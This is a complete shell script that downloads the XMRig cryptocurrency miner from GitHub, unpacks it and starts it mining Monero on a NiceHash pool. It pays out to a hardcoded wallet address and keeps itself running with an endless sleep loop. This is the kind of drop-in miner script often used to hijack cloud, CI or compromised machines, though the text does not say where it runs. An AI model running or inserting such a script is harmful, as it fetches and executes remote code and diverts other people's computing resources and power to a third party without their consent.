
#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0 
./xmrig  --donate-level=1 -o stratum+tcp://randomxmonero.eu.nicehash.com:3380 -u 3FSqW1MFAdzekG6DdvfUhPVnwVY4C9zBAG.3va79sy0yzdrsoc -k -a RandomX --nicehash -p x --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999
